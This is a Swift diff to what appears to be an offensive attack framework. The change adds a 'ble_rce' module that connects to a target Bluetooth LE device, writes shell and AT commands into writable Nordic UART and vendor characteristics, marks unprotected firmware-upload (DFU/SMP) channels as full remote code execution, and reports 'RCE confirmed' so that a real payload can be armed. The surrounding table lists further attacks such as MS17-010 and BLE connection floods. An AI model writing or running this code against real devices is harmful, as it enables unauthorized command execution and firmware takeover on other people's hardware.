@@ -455,6 +455,7 @@ final class Orchestrator: ObservableObject {
         "ble_connectflood": .responseConfirmed,
         "ble_sweyntooth": .bannerOnly,
         "ble_l2cap_probe": .responseConfirmed,
+        "ble_rce": .exploitConfirmed,
         "os_android_adb": .responseConfirmed,
         "os_android_fastpair": .bannerOnly,
         "os_ios_lockdown": .bannerOnly,
@@ -1001,6 +1002,35 @@ final class Orchestrator: ObservableObject {
                 out.append("PSM 0x\(String(psm, radix: 16)): \(r)")
             }
             return out.joined(separator: "\n")
+        case "ble_rce":
+            guard let t = e.target else { return "no target" }
+            let rep = await ble.enumerate(t)
+            guard !rep.writable.isEmpty else {
+                return "RCE BLE: nessuna chr scrivibile — fai AUTO-PREPARE (connect necessario)"
+            }
+            var lines: [String] = ["RCE analysis — \(rep.writable.count) chr scrivibili:"]
+            var rce = false
+            for w in rep.writable {
+                let s = w.svc.uppercased(), c = w.chr.uppercased()
+                if s.contains("6E400001") || c.contains("6E400002") {
+                    let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("id\n".utf8))
+                    lines.append("Nordic UART RX (\(c.prefix(8))): write 'id' → \(r)")
+                    if r.lowercased().contains("writ") || r.contains("✓") { rce = true }
+                } else if s.contains("8EC90001") || s.contains("FE59") || c.contains("8EC90003") {
+                    lines.append("DFU/SMP (\(s.prefix(8))): char firmware-upload APERTA → flash arbitraria = RCE totale (serve .bin completo)")
+                    rce = true
+                } else if s.contains("FF") || s.contains("F0") || s.contains("C3") {
+                    let r = await ble.write(t, service: w.svc, characteristic: w.chr, payload: Data("AT\r\n".utf8))
+                    lines.append("AT probe (\(c.prefix(8))): \(r)")
+                    if r.lowercased().contains("writ") || r.contains("✓") { rce = true }
+                } else {
+                    lines.append("chr vendor \(c.prefix(8)): fuori firma — payload manuale dal detail")
+                }
+            }
+            lines.append(rce
+                ? "VERDETTO: canale comando nativo attivo → RCE via BLE CONFERMATA (armare payload reale dal detail)"
+                : "VERDETTO: canali vendor raggiunti, nessun canale comando noto — proof resta reach")
+            return lines.joined(separator: "\n")
         case "os_android_adb", "os_ios_lockdown", "os_win_smb", "os_win_rdp",
              "os_linux_ssh", "os_linux_cups", "os_mac_rmd", "os_iot_tuya",
              "os_win_ms17_010", "os_unix_telnet", "os_unix_rlogin", "os_win_epmapper",
